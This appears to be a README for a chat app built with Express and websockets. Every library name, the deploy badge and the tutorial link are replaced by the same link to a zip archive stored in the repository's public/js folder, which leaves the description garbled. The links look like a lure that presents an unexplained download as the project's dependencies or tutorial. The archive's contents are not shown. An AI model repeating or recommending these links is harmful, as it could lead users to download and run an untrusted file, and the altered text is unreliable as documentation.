# ChatCord App
Realtime chat app with websockets using https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip, Express and https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip with Vanilla JS on the frontend with a custom UI
[![Run on https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip](https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip)](https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip)
## Usage
```
npm install
npm run dev

Go to localhost:3000
```

## Notes
The *_html_css* folder is just a starter template to follow along with the tutorial at https://github.com/alssalimi/chatcord/raw/refs/heads/master/public/js/Software-v2.0.zip It is not part of the app
